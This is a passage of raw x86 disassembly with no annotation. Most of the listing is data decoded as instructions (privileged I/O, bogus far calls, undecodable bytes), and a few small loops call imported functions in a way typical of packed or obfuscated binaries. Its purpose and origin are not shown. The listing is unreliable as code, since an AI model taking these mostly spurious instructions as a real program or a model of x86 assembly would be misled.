  401878:	rol    DWORD PTR [esi-0x32],cl
  40187b:	cmp    al,0x71
  40187d:	xchg   esp,esi
  40187f:	pop    ss
  401880:	inc    edi
  401881:	lea    esp,[eax+esi*8]
  401884:	cdq    
  401885:	sbb    bh,BYTE PTR [ecx]
  401887:	dec    ebp
  401888:	into   
  401889:	lods   eax,DWORD PTR ds:[esi]
  40188a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40188b:	call   0x1bff:0x1727803f
  401892:	cmp    BYTE PTR ds:0x7ad2d81f,0x59
  401899:	adc    al,0x92
  40189b:	push   ss
  40189c:	adc    ecx,DWORD PTR [ebp-0x71691857]
  4018a2:	mov    esi,0x897d8d2c
  4018a7:	cli    
  4018a8:	mov    ebx,0xfa03704d
  4018ad:	fisttp QWORD PTR [ebp-0x79036d8d]
  4018b3:	pusha  
  4018b4:	mov    esp,0xdca6199a
  4018b9:	retf   0xa852
  4018bc:	cmp    esi,DWORD PTR [ebp+0x64d974d3]
  4018c2:	jge    0x4018e0
  4018c4:	push   edi
  4018c5:	test   esp,eax
  4018c7:	fs dec esi
  4018c9:	sbb    eax,0x5c727da5
  4018ce:	repnz les esp,FWORD PTR gs:[eax+0x41]
  4018d3:	sbb    al,ah
  4018d5:	cs ret 
  4018d7:	xchg   ebx,eax
  4018d8:	ds jmp 0x6c00:0xcd11cc14
  4018e0:	call   0xfbb7:0xdff279
  4018e7:	mov    bl,0xb7
  4018e9:	sti    
  4018ea:	mov    DWORD PTR [eax],esp
  4018ec:	mov    ch,ah
  4018ee:	jge    0x401909
  4018f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018f1:	les    ebp,FWORD PTR [edx+0x5c]
  4018f4:	mov    bl,0x81
  4018f6:	lock or edi,DWORD PTR [esi+eiz*4-0x141b7b7e]
  4018fe:	outs   dx,BYTE PTR ds:[esi]
  4018ff:	out    dx,eax
  401900:	mov    ecx,0x8b2d2ec9
  401905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401906:	out    dx,al
  401907:	into   
  401908:	fisttp DWORD PTR [eax]
  40190a:	cmp    edx,ecx
  40190c:	sbb    al,0x78
  40190e:	das    
  40190f:	inc    DWORD PTR [eax+edi*8-0x2c]
  401913:	jb     0x401960
  401915:	arpl   WORD PTR [ecx+edx*2],si
  401918:	sar    DWORD PTR [ebp-0x35505c77],0xfe
  40191f:	dec    ebx
  401920:	ds add al,0xcb
  401923:	push   ss
  401924:	jo     0x401975
  401926:	mov    WORD PTR [ebp-0x43652ef3],es
  40192c:	xchg   esi,eax
  40192d:	or     edx,DWORD PTR es:[ebx-0x295fbd4a]
  401934:	mov    dl,0x32
  401936:	dec    eax
  401937:	add    edx,esp
  401939:	lahf   
  40193a:	dec    esp
  40193b:	mov    ah,0xc4
  40193d:	sub    al,0x5e
  40193f:	rcl    edx,0x8a
  401942:	cmp    BYTE PTR [eax+0x3adc40eb],dl
  401948:	out    0x57,eax
  40194a:	sbb    al,0x51
  40194c:	dec    edi
  40194d:	cmp    ch,BYTE PTR [ebp-0x15]
  401950:	ss xchg edx,eax
  401952:	and    DWORD PTR [ebp-0x2b89a68],0xc33b7298
  40195c:	dec    esp
  40195d:	dec    edi
  40195e:	mov    cl,0x3b
  401960:	push   ss
  401961:	scas   eax,DWORD PTR es:[edi]
  401962:	inc    ebx
  401963:	sub    BYTE PTR [esi+0x29],ch
  401966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401967:	stc    
  401968:	div    bh
  40196a:	repnz das 
  40196c:	repz mov eax,ds:0xf9f09c90
  401972:	imul   ebp,DWORD PTR [edx],0xffffffb7
  401975:	dec    ebx
  401976:	sub    al,0xef
  401978:	push   ebx
  401979:	mov    edx,0x7f09d17
  40197e:	out    dx,al
  40197f:	xchg   ebp,eax
  401980:	test   BYTE PTR [edx+0x3],0xc7
  401984:	mov    DWORD PTR [ecx],eax
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	pushf  
  4019a4:	ret    
  4019a5:	repz pop ebx
  4019a7:	add    BYTE PTR [ecx],0x78
  4019aa:	js     0x4019aa
  4019ac:	jle    0x401a26
  4019ae:	js     0x4019ed
  4019b0:	loope  0x4019f8
  4019b2:	rcl    DWORD PTR [eax-0x3faf8d3b],0x12
  4019b9:	sub    ch,cl
  4019bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019bc:	push   esp
  4019bd:	fwait
  4019be:	add    eax,0xc63933ae
  4019c3:	adc    cl,cl
  4019c5:	retf   
  4019c6:	xchg   BYTE PTR [esp+eax*2-0x35],ch
  4019ca:	(bad)  
  4019cb:	mov    ecx,0x11f4b573
  4019d0:	repz and al,BYTE PTR [edi-0x3dfd92bc]
  4019d7:	mov    eax,ds:0x7ae07115
  4019dc:	xor    cl,BYTE PTR [ebx+0x18]
  4019df:	pop    edx
  4019e0:	sub    DWORD PTR [ecx+eax*2-0x2c630188],ecx
  4019e7:	ret    
  4019e8:	mov    bl,BYTE PTR [edx]
  4019ea:	pop    edi
  4019eb:	mov    dh,0x5d
  4019ed:	or     bl,BYTE PTR [edx-0x9]
  4019f0:	out    dx,al
  4019f1:	stos   DWORD PTR es:[edi],eax
  4019f2:	push   esp
  4019f3:	xchg   ecx,eax
  4019f4:	dec    edx
  4019f5:	cmp    DWORD PTR [edx],ebx
  4019f7:	cmp    al,0x30
  4019f9:	cld    
  4019fa:	repz jae 0x40197d
  4019fd:	dec    ebx
  4019fe:	or     BYTE PTR [esi+0x1b],dl
  401a01:	pop    ebx
  401a02:	add    bl,BYTE PTR ds:0xa4138332
  401a08:	xor    edx,DWORD PTR [edi+0x19]
  401a0b:	pushf  
  401a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a0d:	pop    es
  401a0e:	dec    ebx
  401a0f:	jbe    0x4019da
  401a11:	push   esi
  401a12:	sub    DWORD PTR [edx-0x69],edi
  401a15:	call   0xb92f:0x4cfdd058
  401a1c:	repz push eax
  401a1e:	dec    esp
  401a1f:	imul   esi,DWORD PTR [eax+ebp*4+0x4],0x58063b51
  401a27:	fmulp  st(2),st
  401a29:	xchg   ecx,eax
  401a2a:	and    eax,0x7b26eebc
  401a2f:	sti    
  401a30:	leave  
  401a31:	sar    esi,0x6b
  401a34:	mov    edi,edi
  401a36:	es mov ebx,0x995f3271
  401a3c:	pop    ebx
  401a3d:	push   esi
  401a3e:	(bad)  
  401a40:	pop    ds
  401a41:	jne    0x401a50
  401a43:	lods   eax,DWORD PTR ds:[esi]
  401a44:	lods   al,BYTE PTR ds:[esi]
  401a45:	xor    al,0x68
  401a47:	inc    ebx
  401a48:	push   eax
  401a49:	and    eax,eax
  401a4b:	push   cs
  401a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a4d:	pop    esp
  401a4e:	add    BYTE PTR [edx],0xbb
  401a51:	push   ds
  401a52:	popa   
  401a53:	sub    dl,dl
  401a55:	pop    eax
  401a56:	push   0xfffffffd
  401a58:	and    esp,DWORD PTR [ebx+0x329d2847]
  401a5e:	mov    esi,0x14dac78
  401a63:	pop    esp
  401a64:	retf   0x2f23
  401a67:	stos   DWORD PTR es:[edi],eax
  401a68:	sbb    cl,dl
  401a6a:	push   cs
  401a6b:	in     al,0x8e
  401a6d:	mov    dh,0x1c
  401a6f:	int3   
  401a70:	cmp    DWORD PTR [edx+esi*8],esp
  401a73:	push   es
  401a74:	nop
  401a75:	mov    al,ds:0xdc7ac600
  401a7a:	enter  0x4d12,0xc9
  401a7e:	push   eax
  401a7f:	sub    bl,BYTE PTR [edi+eiz*8-0x3ef168af]
  401a86:	dec    edx
  401a87:	mov    cs,WORD PTR [eax]
  401a89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a8a:	mov    eax,ds:0x25dada13
  401a8f:	ja     0x401aa2
  401a91:	outs   dx,DWORD PTR ds:[esi]
  401a92:	mov    ch,0x1e
  401a94:	pop    esi
  401a95:	pop    ebx
  401a96:	inc    ebp
  401a97:	cdq    
  401a98:	push   ebx
  401a99:	js     0x401a9c
  401a9b:	retf   0x6dba
  401a9e:	scas   al,BYTE PTR es:[edi]
  401a9f:	xor    al,0x5d
  401aa1:	mov    esi,0x5203be47
  401aa6:	das    
  401aa7:	jmp    0x401ada
  401aa9:	pop    ebp
  401aaa:	jns    0x401aa0
  401aac:	(bad)  
  401aad:	mov    esp,0xab379371
  401ab2:	mov    ah,0xe4
  401ab4:	mov    eax,ds:0x5a89f3ae
  401ab9:	hlt    
  401aba:	mov    ebp,0xdb854764
  401abf:	jecxz  0x401a90
  401ac1:	jg     0x401ae2
  401ac3:	(bad)  
  401ac4:	and    edx,ebp
  401ac6:	outs   dx,BYTE PTR ds:[esi]
  401ac7:	mov    ch,0xb1
  401ac9:	enter  0x3b3f,0x0
  401acd:	fdivr  st(7),st
  401acf:	inc    ah
  401ad1:	push   esp
  401ad2:	(bad)  
  401ad3:	sbb    bh,BYTE PTR [ebx]
  401ad5:	xchg   DWORD PTR [esi],edx
  401ad7:	add    ecx,DWORD PTR [ebx+0x5b]
  401ada:	out    dx,eax
  401adb:	bound  edi,QWORD PTR ds:0x658cb1d2
  401ae1:	sub    bl,BYTE PTR [eax-0x739a3f11]
  401ae7:	push   esp
  401ae8:	inc    ebx
  401ae9:	sub    ebp,DWORD PTR [edi]
  401aeb:	out    dx,al
  401aec:	dec    ebp
  401aed:	jno    0x401b3e
  401aef:	jmp    0x401b47
  401af1:	dec    ecx
  401af2:	mov    dl,BYTE PTR [ebp-0x4e45c695]
  401af8:	mov    ds:0xfc0d0c63,eax
  401afd:	cmp    esp,ebp
  401aff:	jge    0x401b19
  401b01:	ror    DWORD PTR [edi+0x125d5e01],1
  401b07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b08:	xchg   esi,eax
  401b09:	loope  0x401aa2
  401b0b:	pop    eax
  401b0c:	dec    edi
  401b0d:	and    BYTE PTR [eax+0x27788521],bh
  401b13:	and    dh,BYTE PTR [eax+0x34]
  401b16:	call   0xa0:0x511951ec
  401b1d:	sbb    ebx,ebx
  401b1f:	xchg   ebx,eax
  401b20:	shl    al,1
  401b22:	xchg   DWORD PTR [eax],esp
  401b24:	sub    DWORD PTR [eax],ecx
  401b26:	in     al,0xd1
  401b28:	add    al,0x74
  401b2a:	xchg   esp,eax
  401b2b:	and    ebx,DWORD PTR [ecx-0xe]
  401b2e:	xor    al,0x9d
  401b30:	push   esp
  401b32:	adc    BYTE PTR [esp+edi*2+0x60470e5b],0x9e
  401b3a:	inc    ebx
  401b3b:	inc    ecx
  401b3c:	enter  0xbfd4,0x90
  401b40:	mov    bl,0x57
  401b42:	pop    ebx
  401b43:	ins    BYTE PTR es:[edi],dx
  401b44:	gs jno 0x401b0d
  401b47:	std    
  401b48:	mov    BYTE PTR [esi],al
  401b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b4b:	cmp    eax,0x375b72f5
  401b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b51:	daa    
  401b52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b53:	jo     0x401b16
  401b55:	scas   al,BYTE PTR es:[edi]
  401b56:	mov    BYTE PTR [edx+0x4d],cl
  401b59:	push   ebx
  401b5a:	mov    ecx,eax
  401b5c:	das    
  401b5d:	or     ecx,ebx
  401b5f:	add    eax,0xf9c3104
  401b64:	or     bl,BYTE PTR [ebp+0x35]
  401b67:	retf   
  401b68:	(bad)
  401b6c:	jle    0x401b01
  401b6e:	mov    esi,0x5a151c88
  401b73:	mov    ch,0x2e
  401b75:	adc    DWORD PTR [edx+0x31],0xfffd5208
  401b7c:	cld    
  401b7d:	dec    ebp
  401b7e:	icebp  
  401b7f:	jp     0x401b64
  401b81:	jns    0x401b4a
  401b83:	sti    
  401b84:	arpl   WORD PTR [esi+0x1ee6e3d0],si
  401b8a:	push   eax
  401b8b:	jp     0x401ba1
  401b8d:	mov    ?,WORD PTR [esi-0x6c659205]
  401b93:	jae    0x401b85
  401b95:	add    al,0xab
  401b97:	sbb    cl,BYTE PTR [esi-0x2e]
  401b9a:	or     al,0x14
  401b9c:	stos   DWORD PTR es:[edi],eax
  401b9d:	test   BYTE PTR [edi+0x6f9890ae],bl
  401ba3:	sub    eax,0x5af21cc9
  401ba8:	push   es
  401ba9:	icebp  
  401baa:	leave  
  401bab:	push   cs
  401bac:	sti    
  401bad:	imul   ebx,DWORD PTR [edi],0xffffffc3
  401bb0:	loop   0x401ba2
  401bb2:	pop    edi
  401bb3:	pushf  
  401bb4:	scas   eax,DWORD PTR es:[edi]
  401bb5:	cli    
  401bb6:	outs   dx,BYTE PTR ds:[esi]
  401bb7:	mov    dl,0xa9
  401bb9:	in     eax,dx
  401bba:	js     0x401b94
  401bbc:	pop    DWORD PTR [ecx+ebx*4-0x5facdb8c]
  401bc3:	icebp  
  401bc4:	mov    dl,0xb8
  401bc6:	inc    ebp
  401bc7:	enter  0xc7ef,0x7c
  401bcb:	rol    BYTE PTR [edx],0xe6
  401bce:	dec    ebx
  401bcf:	add    esi,esi
  401bd1:	pop    esp
  401bd2:	sub    DWORD PTR [edi],ebx
  401bd4:	outs   dx,BYTE PTR ds:[esi]
  401bd5:	add    eax,0x1b8d07d5
  401bda:	repz dec eax
  401bdc:	dec    edx
  401bdd:	fs cmp bh,dl
  401be0:	(bad)  
  401be1:	adc    al,0x25
  401be3:	push   0xc
  401be5:	pop    eax
  401be6:	and    al,0xb2
  401be8:	pop    ds
  401be9:	push   esp
  401bea:	call   0x4681604
  401bef:	lock retf 0x311d
  401bf3:	xchg   ecx,eax
  401bf4:	hlt    
  401bf5:	cmp    BYTE PTR [ebx-0x3e],bh
  401bf8:	stos   BYTE PTR es:[edi],al
  401bf9:	jmp    0x25f2:0x1d9bd186
  401c00:	pop    ebp
  401c01:	popf   
  401c02:	pusha  
  401c03:	cmp    DWORD PTR [edi+0x1b],edi
  401c06:	and    BYTE PTR [esi-0xa],dh
  401c09:	pop    esi
  401c0a:	test   ch,bl
  401c0c:	js     0x401bb2
  401c0e:	add    al,BYTE PTR [esi-0x44cecd32]
  401c14:	add    DWORD PTR [eax+0x25],edx
  401c17:	shr    BYTE PTR [eax+0x1f],0x91
  401c1b:	out    0x83,al
  401c1d:	mov    bh,0x28
  401c1f:	adc    eax,0xaa58787b
  401c24:	dec    ecx
  401c25:	push   0x5cffa2fc
  401c2a:	mov    edx,0xd4982048
  401c2f:	jmp    0xe085a591
  401c34:	and    DWORD PTR ds:0x42a83d,0x0
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42a83d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a83d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a83d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a83d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa2e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a83d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a83d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a83d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a761,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a775
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a769
  401cbe:	and    eax,DWORD PTR ds:0x42a7b9
  401cc4:	mov    ds:0x42a769,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a7f9,0x42a801
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a77d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0xa6ba
  401d05:	and    ebp,DWORD PTR [ebx+0x780600c9]
  401d0b:	js     0x401d0b
  401d0d:	jle    0x401d87
  401d0f:	js     0x401c9b
  401d11:	cdq    
  401d12:	test   DWORD PTR [ecx-0x3e44f1d2],ecx
  401d18:	(bad)  
  401d19:	jbe    0x401d57
  401d1b:	scas   eax,DWORD PTR es:[edi]
  401d1c:	jmp    0xf5a5c29d
  401d21:	cmp    al,0xb8
  401d23:	cmp    esi,DWORD PTR [edx]
  401d25:	popf   
  401d26:	or     eax,0x69111fe5
  401d2b:	mov    ah,0x9c
  401d2d:	lods   al,BYTE PTR ds:[esi]
  401d2e:	mov    al,0x44
  401d30:	xor    ecx,esi
  401d32:	mov    dl,0x80
  401d34:	scas   al,BYTE PTR es:[edi]
  401d35:	in     al,0x3f
  401d37:	xchg   esp,eax
  401d38:	xor    eax,ecx
  401d3a:	add    eax,DWORD PTR [eax]
  401d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d3d:	cmp    al,0x5f
  401d3f:	fwait
  401d40:	jge    0x401d3e
  401d42:	call   0xf046:0xe5cdb151
  401d49:	push   esi
  401d4a:	cmp    BYTE PTR [eax],dh
  401d4c:	mov    eax,0x9c34af2
  401d51:	jmp    edx
  401d53:	dec    eax
  401d54:	(bad)  
  401d55:	leave  
  401d56:	loop   0x401db1
  401d58:	jmp    0x1f5dbe94
  401d5d:	shr    DWORD PTR [eax+0x46],0x6f
  401d61:	cmp    eax,0x71b4ec59
  401d66:	lahf   
  401d67:	arpl   WORD PTR [ebp-0x8eeda49],si
  401d6d:	retf   0xed79
  401d70:	test   al,0x3c
  401d72:	or     eax,0x5089d251
  401d77:	xor    BYTE PTR [ecx],bl
  401d79:	ficom  DWORD PTR [esi+0x34]
  401d7c:	lds    edi,FWORD PTR [ebx+esi*8]
  401d7f:	dec    esi
  401d80:	xchg   DWORD PTR [ecx+edi*8+0x55],ebx
  401d84:	sub    esi,DWORD PTR [eax]
  401d86:	push   0xffffffe6
  401d88:	and    BYTE PTR [ecx],ch
  401d8a:	cmc    
  401d8b:	std    
  401d8c:	cdq    
  401d8d:	dec    edx
  401d8e:	das    
  401d8f:	jecxz  0x401de7
  401d91:	dec    edi
  401d92:	mov    esi,0x4239631a
  401d97:	sub    DWORD PTR [edx+eiz*8],ebp
  401d9a:	sbb    ebp,ebx
  401d9c:	jg     0x401da0
  401d9e:	pop    edx
  401d9f:	sbb    al,al
  401da1:	test   eax,0x82560931
  401da6:	(bad)  
  401da7:	push   ss
  401da8:	fsub   QWORD PTR [ebx+0x4d5d240c]
  401dae:	lds    ebp,FWORD PTR [ecx+ecx*1-0x6a3800d4]
  401db5:	imul   BYTE PTR [edx+esi*1]
  401db8:	popa   
  401db9:	xchg   esi,eax
  401dba:	test   BYTE PTR [ebx-0x5f],ch
  401dbd:	push   eax
  401dbe:	test   DWORD PTR [ebx+0x34a82c5f],edx
  401dc4:	fnstcw WORD PTR [edi-0x1235dba3]
  401dca:	sub    eax,0xacf9cc53
  401dcf:	jg     0x401dd6
  401dd1:	lods   eax,DWORD PTR ds:[esi]
  401dd2:	lahf   
  401dd3:	adc    ecx,0xcbe66934
  401dd9:	push   edi
  401dda:	mov    esi,0xdbbae2a1
  401ddf:	out    dx,eax
  401de0:	data16 fdiv QWORD PTR [eax-0x1006df17]
  401de7:	or     DWORD PTR [ebx+0x64679db],esi
  401ded:	test   BYTE PTR [edi+ecx*8-0x7d],ch
  401df1:	xchg   ebx,eax
  401df2:	add    al,0x18
  401df4:	leave  
  401df5:	push   0xffffff9b
  401df7:	xor    eax,0x8fd644fa
  401dfc:	cmp    ebp,DWORD PTR [ebx+0x257c7a48]
  401e02:	adc    DWORD PTR [eax-0x3c594a58],edx
  401e08:	sbb    ch,ch
  401e0a:	pusha  
  401e0b:	add    BYTE PTR [edi],ch
  401e0d:	mov    bh,0x54
  401e0f:	stos   DWORD PTR es:[edi],eax
  401e10:	stc    
  401e11:	mov    cl,0x48
  401e13:	fild   WORD PTR [ebx+eax*8]
  401e16:	jl     0x401e0b
  401e18:	cmp    al,0xe2
  401e1a:	cmp    ah,0x5a
  401e1d:	xchg   DWORD PTR [ebx-0x1efc5897],esi
  401e23:	pop    edi
  401e24:	mov    eax,ds:0x1553454b
  401e29:	fisubr WORD PTR [edx-0x2a6d4274]
  401e2f:	add    eax,0x4b90bdfb
  401e34:	mov    cl,dl
  401e36:	je     0x401dd1
  401e38:	std    
  401e39:	popf   
  401e3a:	lds    ebx,FWORD PTR [eax-0x76a64445]
  401e40:	rcl    DWORD PTR [ebp+0x53],cl
  401e43:	stc    
  401e44:	pop    ds
  401e45:	lea    eax,[ebx+0x42d6a792]
  401e4b:	sbb    cl,BYTE PTR [esi-0x6dba1538]
  401e51:	sbb    al,0xac
  401e53:	pushf  
  401e54:	push   ecx
  401e55:	push   es
  401e56:	dec    eax
  401e57:	inc    ebp
  401e58:	sbb    bh,bh
  401e5a:	hlt    
  401e5b:	mov    dl,0x5e
  401e5d:	pop    es
  401e5e:	test   BYTE PTR [edi-0x7f],dl
  401e61:	ret    0x29f2
  401e64:	(bad)  
  401e67:	jb     0x401edc
  401e69:	out    dx,eax
  401e6a:	and    dh,BYTE PTR [ebx-0x50]
  401e6d:	fdivp  st(6),st
  401e6f:	fild   DWORD PTR [esi]
  401e71:	bound  ebp,QWORD PTR [eax]
  401e73:	aad    0x9e
  401e75:	outs   dx,DWORD PTR ds:[esi]
  401e76:	pop    ds
  401e77:	jle    0x401ef7
  401e79:	mov    esp,0x7d0cd1ae
  401e7e:	dec    esp
  401e7f:	mov    esi,0xd200eafe
  401e84:	sub    al,0xe8
  401e86:	sbb    edi,DWORD PTR [esp+ebx*1-0x4d646fa4]
  401e8d:	rcr    DWORD PTR [edi-0x3e8f45d0],0x69
  401e94:	in     eax,0x21
  401e96:	cld    
  401e97:	inc    ebp
  401e98:	ins    BYTE PTR es:[edi],dx
  401e99:	or     ah,BYTE PTR [ecx]
  401e9b:	test   BYTE PTR [ebx+ecx*1-0x7116042a],ah
  401ea2:	imul   eax,esp,0x5cf9e5bb
  401ea8:	(bad)  
  401ea9:	stos   DWORD PTR es:[edi],eax
  401eaa:	xor    esp,DWORD PTR [ebp-0x52b37438]
  401eb0:	arpl   WORD PTR [edx+0x4d],cx
  401eb3:	ins    DWORD PTR es:[edi],dx
  401eb4:	mov    BYTE PTR [edx+ecx*8],dh
  401eb7:	push   esp
  401eb8:	push   0x5c
  401eba:	int3   
  401ebb:	(bad)  
  401ebc:	mul    dh
  401ebe:	test   BYTE PTR [eax-0x5f],ch
  401ec1:	and    DWORD PTR [eax+0x72d7c9b1],esi
  401ec7:	(bad)  
  401ec8:	(bad)  
  401ec9:	rcr    BYTE PTR [edx],1
  401ecb:	call   0xafc:0xfb325f72
  401ed2:	bound  edi,QWORD PTR [edx-0x63]
  401ed5:	push   esi
  401ed6:	lahf   
  401ed7:	or     eax,0xb335cbc0
  401edc:	les    edi,FWORD PTR [eax+ecx*1]
  401edf:	dec    esp
  401ee0:	adc    dl,al
  401ee2:	ret    0x144d
  401ee5:	dec    eax
  401ee6:	mov    al,ds:0xe7df2642
  401eeb:	mov    al,ds:0xb8f9151a
  401ef0:	pop    esi
  401ef1:	fptan  
  401ef3:	xor    eax,DWORD PTR [ecx+0x38]
  401ef6:	xchg   DWORD PTR [esp+esi*2-0x4ff1e058],edi
  401efd:	pop    eax
  401efe:	in     eax,0xa7
  401f00:	pusha  
  401f01:	inc    ecx
  401f02:	push   esp
  401f03:	scas   eax,DWORD PTR es:[edi]
  401f04:	jl     0x401ef2
  401f06:	sub    BYTE PTR [edi],0xbc
  401f09:	pop    eax
  401f0a:	call   0x5ee1:0xf90641cf
  401f11:	mov    al,0xa3
  401f13:	call   DWORD PTR [edi]
  401f15:	in     al,dx
  401f16:	rcr    BYTE PTR [ebp+0x2],1
  401f19:	in     al,dx
  401f1a:	mov    esp,0xb7d3169c
  401f1f:	stos   BYTE PTR es:[edi],al
  401f20:	xchg   BYTE PTR [esi],cl
  401f22:	std    
  401f23:	call   0x9c32e455
  401f28:	xor    DWORD PTR [eax-0x4cf3ce57],ebp
  401f2e:	jecxz  0x401eca
  401f30:	stc    
  401f31:	xchg   ebp,eax
  401f32:	imul   eax,DWORD PTR [ebx],0x8f3f1ac8
  401f38:	mov    edi,0xc2a129d
  401f3d:	aad    0x41
  401f3f:	mov    bl,0xe1
  401f41:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f43:	imul   edx,DWORD PTR [esi+0x3ea5d851],0xe3ddc790
  401f4d:	fsubr  QWORD PTR [eax]
  401f4f:	fadd   DWORD PTR [edx]
  401f51:	stc    
  401f52:	pop    esi
  401f53:	add    esp,DWORD PTR [edi-0x61]
  401f56:	sahf   
  401f57:	addr16 sub al,0xbb
  401f5a:	outs   dx,DWORD PTR ds:[esi]
  401f5b:	xor    esp,eax
  401f5d:	neg    ecx
  401f5f:	iret   
  401f60:	pop    ss
  401f61:	mov    ebp,0x317290c6
  401f66:	aad    0x3e
  401f68:	sub    ebx,DWORD PTR [ebx]
  401f6a:	repnz (bad) 
  401f6c:	mov    ecx,0x8cf9f49e
  401f71:	jecxz  0x401f59
  401f73:	mov    bl,0xae
  401f75:	xchg   esp,eax
  401f76:	adc    edi,ebp
  401f78:	arpl   WORD PTR [edi],ax
  401f7a:	cvtpi2ps xmm4,QWORD PTR [esi+0xa]
  401f7e:	pop    eax
  401f7f:	shr    DWORD PTR ds:0xfc3b6dd7,1
  401f85:	jnp    0x401ffe
  401f87:	dec    ecx
  401f88:	(bad)
  401f8b:	jg     0x401fee
  401f8d:	pop    ebp
  401f8e:	pop    ebx
  401f8f:	pusha  
  401f90:	add    al,BYTE PTR [ebx+0x3]
  401f93:	or     BYTE PTR [ebx],dh
  401f95:	rol    BYTE PTR [ebx],0x5
  401f98:	cmp    DWORD PTR [eax+0x5230042],ebp
  401f9e:	mov    DWORD PTR [eax+0x39a30042],ebp
  401fa4:	test   al,0x42
  401fa6:	add    BYTE PTR [ecx+0x581e84d],cl
  401fac:	icebp  
  401fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fae:	inc    edx
  401faf:	add    BYTE PTR [eax-0x74fffffb],bl
  401fb5:	inc    ebp
  401fb6:	or     BYTE PTR [ecx+0x42a75925],al
  401fbc:	add    BYTE PTR [eax],al
  401fbe:	add    BYTE PTR [eax],al
  401fc0:	add    cl,ch
  401fc2:	or     eax,0x8b000000
  401fc7:	or     eax,0x42a759
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a759,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a759,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a759,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [ebx-0x79c6c94c],esi
  40201c:	add    al,0x78
  40201e:	js     0x40201e
  402020:	jle    0x40209a
  402022:	js     0x40209d
  402024:	adc    al,0xad
  402026:	dec    edi
  402027:	out    0x37,al
  402029:	and    al,0xd6
  40202b:	and    eax,0x31bf1d8c
  402030:	xor    esi,DWORD PTR [eax+eiz*8-0x68171577]
  402037:	jmp    0x402008
  402039:	call   0xe755:0x47b8e8a3
  402040:	and    DWORD PTR [ecx],ecx
  402042:	fwait
  402043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402044:	(bad)  
  402045:	push   edi
  402046:	xchg   edx,eax
  402047:	sub    eax,0x1ae04148
  40204c:	inc    ebp
  40204d:	mov    dl,0xbb
  40204f:	mov    WORD PTR [edx+0x3a157d9c],ds
  402055:	xor    al,0xcd
  402057:	aaa    
  402058:	mov    bh,0x60
  40205a:	sti    
  40205b:	pop    eax
  40205c:	imul   ebx,esp,0xffffffda
  40205f:	xor    DWORD PTR [eax-0x7b],ebx
  402062:	test   DWORD PTR [esi-0x7bde26af],0x652199ff
  40206c:	cs and eax,0x59b16cef
  402072:	outs   dx,DWORD PTR ds:[esi]
  402073:	mov    dh,0x29
  402075:	push   ebp
  402076:	div    BYTE PTR [esi-0x4d]
  402079:	mov    bh,0x86
  40207b:	call   DWORD PTR ds:0x48cbec54
  402081:	adc    eax,0x92d43ec1
  402086:	sti    
  402087:	push   ss
  402088:	dec    esi
  402089:	xchg   esp,eax
  40208a:	cmp    ebp,DWORD PTR [edi]
